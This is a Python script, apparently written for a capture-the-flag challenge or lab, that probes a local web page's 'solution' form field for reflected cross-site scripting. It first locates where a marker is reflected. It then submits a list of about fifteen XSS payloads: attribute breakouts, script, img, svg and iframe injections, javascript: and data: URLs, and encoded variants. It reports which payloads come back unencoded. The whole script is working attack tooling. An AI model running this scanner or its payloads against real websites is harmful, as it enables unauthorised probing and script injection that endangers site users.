import requests
import re

base_url = "http://127.0.0.1:33202"

print("="*80)
print("ANALYZING XSS INJECTION POINT - Server-side reflection")
print("="*80)

# First, let's see exactly where our input goes
marker = 'MARKER_XSS_999'
data = {'solution': marker}

try:
    response = requests.post(f"{base_url}/page", data=data, timeout=10)
    print(f"\n[*] Posted marker: {marker}")
    print(f"[*] Response status: {response.status_code}")
    
    # Find the marker
    pos = response.text.find(marker)
    if pos != -1:
        print(f"[!] Marker found at position {pos}")
        
        # Show context
        start = max(0, pos - 200)
        end = min(len(response.text), pos + len(marker) + 200)
        context = response.text[start:end]
        
        print(f"\nContext:")
        print("-"*80)
        print(context)
        print("-"*80)
        
        # Determine the injection context
        before = response.text[:pos]
        after = response.text[pos+len(marker):]
        
        print(f"\n[Analysis]")
        if 'value="' in before[-30:]:
            print(f"[!] Input is reflected INSIDE the value attribute")
            print(f"[!] We need to break out: \"><script>...")
        else:
            print(f"[?] Checking if input is outside HTML tags...")
            
except requests.exceptions.RequestException as e:
    print(f"[!] Error: {e}")

print(f"\n\n{'='*80}")
print("TESTING XSS PAYLOADS")
print("="*80)

# Test various XSS payloads to find one that works
test_payloads = [
    # Try event handlers in the input itself
    r'" onfocus="alert(1)" autofocus="',
    r'" onmouseover="alert(1)">',
    r'" onerror="alert(1)">',
    r'" onload="alert(1)">',
    
    # Break out of input tag
    r'"><script>alert(1)</script>',
    r'"><img src=x onerror=alert(1)>',
    r'"><svg/onload=alert(1)>',
    r'"><iframe src=javascript:alert(1)>',
    r'"><body onload=alert(1)>',
    
    # Try without breaking out (if input is after the tag)
    r'</form><script>alert(1)</script><form>',
    r'<img src=x onerror=alert(1)>',
    
    # URL-based
    r'javascript:alert(1)',
    r'java
script:alert(1)',
    r'data:text/html,<script>alert(1)</script>',
    
    # Encoded variants
    r'"%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E',
]

success_count = 0
for i, payload in enumerate(test_payloads, 1):
    print(f"\nTest {i:2d}: {payload}")
    print("-"*80)
    
    data = {'solution': payload}
    try:
        response = requests.post(f"{base_url}/page", data=data, timeout=10)
        
        # Check if payload appears unencoded
        if payload in response.text:
            print(f"[!] PAYLOAD REFLECTED UNENCODED!")
            
            # Find position
            pos = response.text.find(payload)
            start = max(0, pos - 150)
            end = min(len(response.text), pos + len(payload) + 150)
            context = response.text[start:end]
            
            print(f"\nContext:")
            print(context)
            print(f"\n[+] This could be an XSS vector!")
            success_count += 1
        elif payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
            print(f"[-] Payload HTML-encoded (safe)")
        else:
            print(f"[-] Not reflected")
            
    except Exception as e:
        print(f"[!] Error: {e}")

print(f"\n{'='*80}")
print(f"Tested {len(test_payloads)} payloads, {success_count} reflected unencoded")
print("="*80)
